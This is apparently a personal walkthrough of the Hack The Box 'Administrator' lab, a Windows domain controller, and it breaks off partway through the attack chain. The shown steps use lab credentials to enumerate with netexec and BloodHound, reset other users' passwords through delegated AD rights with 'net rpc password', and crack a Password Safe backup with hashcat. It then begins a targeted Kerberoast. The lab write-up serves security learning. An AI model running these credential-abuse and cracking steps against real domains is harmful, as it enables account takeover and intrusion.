assumed breach 
https://app.hackthebox.com/machines/Administrator

Username: Olivia Password: ichliebedich

nmap -p- -sCV -T4 10.129.15.157

```

┌─[sg-free-1]─[10.10.14.25]─[lancelee@htb-drmex7gshk]─[~]
└──╼ [★]$ nmap -p- -sCV -T4 10.129.15.157
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-31 20:45 CDT
Stats: 0:00:54 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 64.00% done; ETC: 20:47 (0:00:25 remaining)
Nmap scan report for 10.129.15.157
Host is up (0.0021s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-01 08:46:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
51671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51682/tcp open  msrpc         Microsoft Windows RPC
51687/tcp open  msrpc         Microsoft Windows RPC
51698/tcp open  msrpc         Microsoft Windows RPC
62702/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-01T08:47:09
|_  start_date: N/A
|_clock-skew: 7h00m00s

```

- Clearly a **Domain Controller (DC)** for `administrator.htb`. We see Kerberos (88), LDAP (389), DNS (53), and SMB (445) all open.

- **Operating System:** Windows Server 2022. This is modern, so legacy exploits (like EternalBlue) are highly unlikely.

- **Remote Management:** * **WinRM (5985):** Open. This is your primary target for an initial shell.
    
    - **RDP (3389):** Not listed in your output snippet, which suggests it might be closed or filtered.
   
- **FTP (21):** Open. This is interesting. Often on these boxes, FTP might allow "Anonymous" login or contain a configuration file with more credentials.

```
 nxc ldap 10.129.15.157 -u 'Olivia' -p 'ichliebedich' -d administrator.htb0 --users
\SMB         10.129.15.157   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
LDAP        10.129.15.157   389    DC               [+] administrator.htb0\Olivia:ichliebedich
LDAP        10.129.15.157   389    DC               [*] Total records returned: 10
LDAP        10.129.15.157   389    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
LDAP        10.129.15.157   389    DC               Administrator                 2024-10-22 18:59:36 0       Built-in account for administering the computer/domain
LDAP        10.129.15.157   389    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
LDAP        10.129.15.157   389    DC               krbtgt                        2024-10-04 19:53:28 0       Key Distribution Center Service Account
LDAP        10.129.15.157   389    DC               olivia                        2024-10-06 01:22:48 0
LDAP        10.129.15.157   389    DC               michael                       2024-10-06 01:33:37 0
LDAP        10.129.15.157   389    DC               benjamin                      2024-10-06 01:34:56 2
LDAP        10.129.15.157   389    DC               emily                         2024-10-30 23:40:02 0
LDAP        10.129.15.157   389    DC               ethan                         2024-10-12 20:52:14 0
LDAP        10.129.15.157   389    DC               alexander                     2024-10-31 00:18:04 0
LDAP        10.129.15.157   389    DC               emma                          2024-10-31 00:18:35 0
┌─[sg-free-1]─[10.10.14.25]─[lancelee@htb-drmex7gshk]─[~]
└──╼ [★]$ 


```

------

```
xc winrm 10.129.15.157 -u 'Olivia' -p 'ichliebedich' -d administrator.htb0
WINRM       10.129.15.157   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.15.157   5985   DC               [+] administrator.htb0\Olivia:ichliebedich (Pwn3d!)

```


------

```
nxc ldap 10.129.15.157 -u 'Olivia' -p 'ichliebedich' -d administrator.htb --groups
SMB         10.129.15.157   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
LDAP        10.129.15.157   389    DC               [+] administrator.htb\Olivia:ichliebedich 
LDAP        10.129.15.157   389    DC               Administrators
LDAP        10.129.15.157   389    DC               Users
LDAP        10.129.15.157   389    DC               Guests
LDAP        10.129.15.157   389    DC               Print Operators
LDAP        10.129.15.157   389    DC               Backup Operators
LDAP        10.129.15.157   389    DC               Replicator
LDAP        10.129.15.157   389    DC               Remote Desktop Users
LDAP        10.129.15.157   389    DC               Network Configuration Operators
LDAP        10.129.15.157   389    DC               Performance Monitor Users
LDAP        10.129.15.157   389    DC               Performance Log Users
LDAP        10.129.15.157   389    DC               Distributed COM Users
LDAP        10.129.15.157   389    DC               IIS_IUSRS
LDAP        10.129.15.157   389    DC               Cryptographic Operators
LDAP        10.129.15.157   389    DC               Event Log Readers
LDAP        10.129.15.157   389    DC               Certificate Service DCOM Access
LDAP        10.129.15.157   389    DC               RDS Remote Access Servers
LDAP        10.129.15.157   389    DC               RDS Endpoint Servers
LDAP        10.129.15.157   389    DC               RDS Management Servers
LDAP        10.129.15.157   389    DC               Hyper-V Administrators
LDAP        10.129.15.157   389    DC               Access Control Assistance Operators
LDAP        10.129.15.157   389    DC               Remote Management Users
LDAP        10.129.15.157   389    DC               Storage Replica Administrators
LDAP        10.129.15.157   389    DC               Domain Computers
LDAP        10.129.15.157   389    DC               Domain Controllers
LDAP        10.129.15.157   389    DC               Schema Admins
LDAP        10.129.15.157   389    DC               Enterprise Admins
LDAP        10.129.15.157   389    DC               Cert Publishers
LDAP        10.129.15.157   389    DC               Domain Admins
LDAP        10.129.15.157   389    DC               Domain Users
LDAP        10.129.15.157   389    DC               Domain Guests
LDAP        10.129.15.157   389    DC               Group Policy Creator Owners
LDAP        10.129.15.157   389    DC               RAS and IAS Servers
LDAP        10.129.15.157   389    DC               Server Operators
LDAP        10.129.15.157   389    DC               Account Operators
LDAP        10.129.15.157   389    DC               Pre-Windows 2000 Compatible Access
LDAP        10.129.15.157   389    DC               Incoming Forest Trust Builders
LDAP        10.129.15.157   389    DC               Windows Authorization Access Group
LDAP        10.129.15.157   389    DC               Terminal Server License Servers
LDAP        10.129.15.157   389    DC               Allowed RODC Password Replication Group
LDAP        10.129.15.157   389    DC               Denied RODC Password Replication Group
LDAP        10.129.15.157   389    DC               Read-only Domain Controllers
LDAP        10.129.15.157   389    DC               Enterprise Read-only Domain Controllers
LDAP        10.129.15.157   389    DC               Cloneable Domain Controllers
LDAP        10.129.15.157   389    DC               Protected Users
LDAP        10.129.15.157   389    DC               Key Admins
LDAP        10.129.15.157   389    DC               Enterprise Key Admins
LDAP        10.129.15.157   389    DC               DnsAdmins
LDAP        10.129.15.157   389    DC               DnsUpdateProxy
LDAP        10.129.15.157   389    DC               Share Moderators

```

----

```
secretsdump.py administrator.htb/Olivia:ichliebedich@10.129.16.44 
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20251002.85540.fc92f471', 'secretsdump.py')
Impacket v0.13.0.dev0+20251002.85540.fc92f471 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up... 

┌──(lanc3㉿kali)-[~]
└─$ secretsdump.py administrator.htb/Olivia:ichliebedich@10.129.16.44 -use-vss
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20251002.85540.fc92f471', 'secretsdump.py')
Impacket v0.13.0.dev0+20251002.85540.fc92f471 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Cleaning up... 
   
```
----

This confirms our suspicion: **Olivia has the rights to manage the box, but she is NOT a Domain Admin.**

In Windows environments, 
being a member of the "Remote Management Users" group (which gives you that `Pwn3d!` status in `nxc`) allows you to log in and run commands, 
## but it doesn't give you the "High Integrity" RPC privileges required to dump the NTDS database or the local SAM hashes remotely.


-----

### The Pivot Strategy

Since I can't "pull" the secrets from the outside, you need to "push" from the inside. Your next step is to get an interactive shell and find out how to escalate from Olivia to the **Administrator**.

----


```

evil-winrm -i 10.129.16.44 -u 'Olivia' -p 'ichliebedich'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\olivia\Documents> 
*Evil-WinRM* PS C:\Users\olivia\Documents> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
administrator\olivia S-1-5-21-1088858960-373806567-254189436-1108


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled



*Evil-WinRM* PS C:\Users\olivia\Documents> net user olivia /domain
User name                    olivia
Full Name                    Olivia Johnson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/5/2024 6:22:48 PM
Password expires             Never
Password changeable          10/6/2024 6:22:48 PM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\olivia\Documents> 


```

------

output clarifies exactly why `secretsdump` was failing and where you stand.

a "Regular" User with Remote Access

look at the **Group Information**:

- n `BUILTIN\Remote Management Users`. This is why `nxc` gave `(Pwn3d!)`—it confirmed you have the right to log in via WinRM.
    
- However, you are **NOT** in `BUILTIN\Administrators` or `Domain Admins`.
    
- Your **Mandatory Label** is `Medium Plus`. A true administrator would have a `High` or `System` label.
    

This is a classic "Initial Access" shell. You have a foothold, but you don't have the permissions to dump hashes or read other users' files yet.

----


dir C:\Users\olivia\Desktop
dir C:\Users\olivia\Downloads
dir C:\


*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/22/2024  11:46 AM                Administrator
d-----        10/30/2024   2:25 PM                emily
d-----          4/2/2026   5:40 AM                olivia
d-r---         10/4/2024  10:08 AM                Public


*Evil-WinRM* PS C:\Users> 

-----
*Evil-WinRM* PS C:\> certutil -ca
  Name: Active Directory Enrollment Policy
  Id: {79B47A22-3743-4AD3-9E13-13B6432AE1BB}
  Url: ldap:
0 CAs:
CertUtil: -CA command completed successfully.
*Evil-WinRM* PS C:\> 

`ertutil -ca` command returned **`0 CAs`**.

**What this tells us:** This specific DC is **not** a Certificate Authority. This rules out the popular "ADCS" (Active Directory Certificate Services) escalation path (like ESC1 or ESC8). You can stop looking for certificate-based vulnerabilities on this specific machine.

----

*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/29/2024   1:05 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---        10/30/2024   4:53 PM                Program Files
d-----        10/30/2024   4:42 PM                Program Files (x86)
d-r---          4/2/2026   5:40 AM                Users
d-----         11/1/2024   1:50 PM                Windows




-----

```
*Evil-WinRM* PS C:\> cd inetpub
*Evil-WinRM* PS C:\inetpub> cd wwwroot
Cannot find path 'C:\inetpub\wwwroot' because it does not exist.
At line:1 char:1
+ cd wwwroot
+ ~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\inetpub\wwwroot:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
*Evil-WinRM* PS C:\inetpub> dir


    Directory: C:\inetpub


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/29/2024   1:05 PM                custerr
d-----         10/5/2024   7:14 PM                ftproot
d-----         11/1/2024   1:27 PM                history
d-----         10/5/2024   9:59 AM                logs
d-----         10/5/2024   9:59 AM                temp


*Evil-WinRM* PS C:\inetpub> cd temp
*Evil-WinRM* PS C:\inetpub\temp> dir


    Directory: C:\inetpub\temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/2/2026   5:08 AM                appPools
d-----         10/5/2024   6:04 PM                IIS Temporary Compressed Files


*Evil-WinRM* PS C:\inetpub\temp> cd ..
*Evil-WinRM* PS C:\inetpub> cd ftproot
*Evil-WinRM* PS C:\inetpub\ftproot> dir
Access to the path 'C:\inetpub\ftproot' is denied.
At line:1 char:1
+ dir
+ ~~~
    + CategoryInfo          : PermissionDenied: (C:\inetpub\ftproot:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
*Evil-WinRM* PS C:\inetpub\ftproot> cd ..
*Evil-WinRM* PS C:\inetpub> cd logs
*Evil-WinRM* PS C:\inetpub\logs> dir
Access to the path 'C:\inetpub\logs' is denied.
At line:1 char:1
+ dir
+ ~~~
    + CategoryInfo          : PermissionDenied: (C:\inetpub\logs:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
*Evil-WinRM* PS C:\inetpub\logs> 


```

----

**`ftproot`** is present, but **`wwwroot`** is missing. This tells us the machine is acting as an **FTP Server** rather than a Web Server.

The **"Access Denied"** on `ftproot` and `logs` is a massive "Hint" in a lab environment. Usually, if a folder is empty, you can list it. If you get "Access Denied," it means there is data inside, but your current user (Olivia) doesn't have the permissions to see it... _yet_.

### 1. The FTP Lead (High Probability)

Remember your `nmap` scan showed **Port 21 (FTP)** was open.

- **The Logic:** Often, an FTP server is used to host files for other users. If `michael` or `administrator` has files in there, that’s where the escalation path lies.
    
- **The Move:** Since you can't see the files from the _inside_ as Olivia, try to see them from the _outside_ via the FTP protocol itself.
    

**Try this from your Kali machine:**

Bash

```
ftp 10.129.16.44
# Try logging in with:
# 1. Anonymous / anonymous
# 2. olivia / ichliebedich
```


----

ftp olivia@10.129.24.166
Connected to 10.129.24.166.
220 Microsoft FTP Service
331 Password required
Password: 
530 User cannot log in, home directory inaccessible.
ftp: Login failed

xc ftp 10.129.24.166 -u olivia -p 'ichliebedich'
FTP         10.129.24.166   21     10.129.24.166    [-] olivia:ichliebedich (Response:530 User cannot log in, home directory inaccessible.)

┌──(lanc3㉿kali)-[~]
└─$ nxc ftp 10.129.24.166 -u Olivia -p 'ichliebedich'
FTP         10.129.24.166   21     10.129.24.166    [-] Olivia:ichliebedich (Response:530 User cannot log in, home directory inaccessible.)


FTP does not work for oliva

--------

evil-winrm -i 10.129.24.166 -u olivia -p 'ichliebedich'            

Evil-WinRM shell v3.9


*Evil-WinRM* PS C:\Users\olivia\Documents> net localgroup "Remote Management Users"
Alias name     Remote Management Users
Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

Members
emily
michael
olivia


-------

# Bloodhound

bloodhound-python -d administrator.htb -c all -u olivia -p ichliebedich -ns 10.129.24.166 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno 113] No route to host
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 49S
INFO: Compressing output into 20260403122654_bloodhound.zip



![[bloodhound-olivia-michael.png|353]]

michael is in the Remote Management Users group too

abuse `GenericAll` is to change the michael user’s password. 
Bloodhound shows how to do this using Linux

```
net rpc password "TargetUser" "newPassword" -U "DOMAIN"/"USER-with-GenericAll"%"password" -S "IP-Domain-Controller"
```

```
net rpc password "michael" "password" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.129.27.140
```

Think of this command as the "Linux-to-Windows" way of performing a remote password reset. 
Running this from your Kali machine (and not from inside the Windows shell), we are using the **Samba** suite to talk to the Domain Controller using the **RPC (Remote Procedure Call)** protocol

| **Component**           | **What it does**                                                                                        |
| ----------------------- | ------------------------------------------------------------------------------------------------------- |
| **`net rpc password`**  | The specific Samba tool and action (change a password via RPC).                                         |
| **`"michael"`**         | **Target**: The account whose password you want to change.                                              |
| **`"password"`**        | **New Payload**:  new password for Michael.                                                             |
| **`-U "admin..."`**     | **Credentials**: Telling the server, "I am Olivia, and here is my password."                            |
| **`"olivia"%"ich..."`** | **Separator**: Samba uses the `%` symbol to separate the username from the password in a single string. |
| **`-S 10.129.27.140`**  | **Server**: IP address of the Domain Controller you are sending this request to.                        |

```
net rpc password "michael" "password" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.129.27.140

┌──(lanc3㉿kali)-[~]
└─$ evil-winrm -i 10.129.27.140 -u 'michael' -p 'password'
...
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\michael\Documents> 

```



![[bloodhound-michael-benjamin.png]]

In the Bloodhound data, michael has `ForceChangePassword` over benjamin

repeating "net rpc password" for michael

```
net rpc password "benjamin" "password" -U "administrator.htb"/"michael"%"password" -S 10.129.27.140
```

```
net rpc password "benjamin" "password" -U "administrator.htb"/"michael"%"password" -S 10.129.27.140

┌──(lanc3㉿kali)-[~]
└─$ nxc smb 10.129.27.140 -u benjamin -p 'password'                                                    
SMB         10.129.27.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)                                                                                                                                           
SMB         10.129.27.140   445    DC               [+] administrator.htb\benjamin:password 

┌──(lanc3㉿kali)-[~]
└─$ nxc winrm 10.129.27.140 -u benjamin -p 'password' 
WINRM       10.129.27.140   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.27.140   5985   DC               [-] administrator.htb\benjamin:password

┌──(lanc3㉿kali)-[~]
└─$ nxc ftp 10.129.27.140 -u benjamin -p 'password' 
FTP         10.129.27.140   21     10.129.27.140    [+] benjamin:password
```



```
ftp benjamin@10.129.27.140
Connected to 10.129.27.140.
220 Microsoft FTP Service
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||52872|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||52873|)
125 Data connection already open; Transfer starting.
100% |********************************************************************************************************************|   952        3.81 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (3.80 KiB/s)
ftp> 

```
---

hashcat Backup.psafe3 /usr/share/wordlists/rockyou.txt

```
hashcat Backup.psafe3 /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
...
* Device #01: cpu--0x000, 3940/7880 MB (1024 MB allocatable), 6MCU

The following 37 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  13711 | VeraCrypt RIPEMD160 + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
...
   6233 | TrueCrypt Whirlpool + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
   5200 | Password Safe v3                                           | Password Manager

Please specify the hash-mode with -m [hash-mode].

...
┌──(lanc3㉿kali)-[~]
└─$ hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
...

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

...

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Backup.psafe3:tekieromucho                                
 
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: Backup.psafe3
Time.Started.....: Mon Apr  6 10:21:22 2026 (2 secs)
Time.Estimated...: Mon Apr  6 10:21:24 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:     3320 H/s (11.08ms) @ Accel:29 Loops:1024 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4872/14344385 (0.03%)
Rejected.........: 0/4872 (0.00%)
Restore.Point....: 4698/14344385 (0.03%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:2048-2049
Candidate.Engine.: Device Generator
Candidates.#01...: integra -> petewentz

Started: Mon Apr  6 10:20:57 2026
Stopped: Mon Apr  6 10:21:26 2026

```

password is “tekieromucho”.


------

**Password Safe uses industry-standard encryption as well as a zero-knowledge policy, but doesn't offer much in the way of additional security features**. Password Safe uses the Twofish algorithm with a 256-bit key and is open source which allows anyone who knows code to inspect it and point out flaws and weaknesses.

sudo apt install passwordsafe

dpkg -L passwordsafe | grep bin

/usr/bin
/usr/bin/pwsafe
 
![[passwordsafe-install.png|391]]
![[passwordsafe-cracked.png|391]]

UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
UXLCI5iETUsIBoFVTj8yQFKoHjXmb
WwANQWnmJnGV07WQN8bMS7FMAbjNur


match each user to a username in Bloodhound, and test them with `netexec`

password
UXLCI5iETUsIBoFVTj8yQFKoHjXmb
works for emily (not for other two)

-----

```

nxc smb 10.129.27.140 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
SMB         10.129.27.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.129.27.140   445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 

```






--------


Bloodhound shows that emily has `GenericWrite` over ethan:


![[bloodhound-ethan.png]]


A **Service Principal Name (SPN)** acts as a unique pointer in Active Directory that links a specific service (like MSSQL or IIS) to a service account. 

**Kerberoasting** is a post-exploitation technique where any authenticated domain user requests a Kerberos service ticket (TGS) for that SPN. Because the domain controller encrypts this ticket using the **NTLM hash** of the service account’s password, an attacker can take that encrypted blob offline and brute-force it to recover the clear-text credentials.

- **The Identifier (SPN):** Think of the SPN as the "alias" for a service. Instead of connecting to a server by IP, Kerberos uses the SPN (e.g., `MSSQLSvc/sql01.administrator.htb:1433`) to know which account’s "key" to use for encryption.

- **The Request:** Any user—even a low-privileged one like **Olivia**—can ask the Domain Controller for a ticket to talk to that service. (what's the condition? GenericWrite ?) The DC doesn't check if you're _allowed_ to use the service yet; it just gives you the ticket.
  
- **The Vulnerability:** The ticket you receive is essentially a "safe" containing a session key. The "lock" on that safe is the password of the service account. If that account has a weak password, you can use tools like `hashcat` or `John the Ripper` to crack the lock on your own machine without ever touching the network again.


----

The only requirement to request a TGS (Service Ticket) for a Kerberoastable account is **to be a valid, authenticated Domain User.**

### Why no special permission is needed

In a Windows environment, the Kerberos protocol is designed so that any user can request to "talk" to any service. Think of it like a **phonebook**:

- **The SPN** is the phone number listed in the directory.
    
- **The Domain Controller** is the operator.
    
- **The Ticket** is the operator connecting your call.
    

The Active Directory (AD) default behavior is to grant a Service Ticket to any authenticated user who asks for a valid SPN. The actual _authorization_ (checking if Olivia is allowed to log into the SQL database, for example) happens **at the service itself** after she presents the ticket.

---

### Where `GenericWrite` and other rights come in

While you don't need special rights to _roast_ an existing SPN, permissions become relevant in these two scenarios:

#### 1. The "Targeted" Kerberoasting (Requires `GenericWrite` or `GenericAll`)

If you have `GenericWrite` over a user account that **doesn't** have an SPN, you can:

1. **Manually assign an SPN** to that user (e.g., `setspn -s shortcut/targetuser targetuser`).
    
2. **Request a ticket** for that new SPN.
    
3. **Roast it.**
    
4. **Clear the SPN** to hide your tracks. This allows you to take a "non-roastable" high-privileged user and make them vulnerable.
    

#### 2. The "DCSync" or "WriteDacl" Rights

Rights like `GenericAll` or `WriteDacl` are much more powerful than Kerberoasting. If you have those over an object, you don't need to crack a password offline; you can simply:

- Reset their password directly (`GenericAll`).
    
- Give yourself DCSync rights (`WriteDacl` on the Domain object).
    

---


- **Standard Kerberoasting:** Requires **zero** special AD permissions. Only requires a valid domain session and an existing SPN on a target account.
    
- **Targeted Kerberoasting:** Requires **`GenericWrite`**, **`GenericAll`**, or **`WriteProperty`** (specifically for the `servicePrincipalName` attribute) to turn a normal user into a roastable one.
-----

use the `GenericWrite` privilege to give ethan an SPN so as to perform a targeted kerberoast

full instructions given in bloodhound

targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'password'


-----

this version uses `uv`, which is a modern Python package manager. 

on Kali ARM64 (MacBook/VM) setup, this is actually the cleaner way to run it without breaking my system Python


echo "ethan" > targets.txt

python3 targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip 10.129.27.140 -U targets.txt

------

```
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
Cloning into 'targetedKerberoast'...
remote: Enumerating objects: 76, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 76 (delta 19), reused 17 (delta 14), pack-reused 43 (from 1)
Receiving objects: 100% (76/76), 252.17 KiB | 4.58 MiB/s, done.
Resolving deltas: 100% (30/30), done.

┌──(lanc3㉿kali)-[~]
└─$ cd targetedKerberoast         

┌──(lanc3㉿kali)-[~/targetedKerberoast]
└─$ uv add --script targetedKerberoast.py -r requirements.txt 
uv: command not found


┌──(lanc3㉿kali)-[~/targetedKerberoast]
└─$ curl -LsSf https://astral.sh/uv/install.sh | sh
source $HOME/.local/bin/env
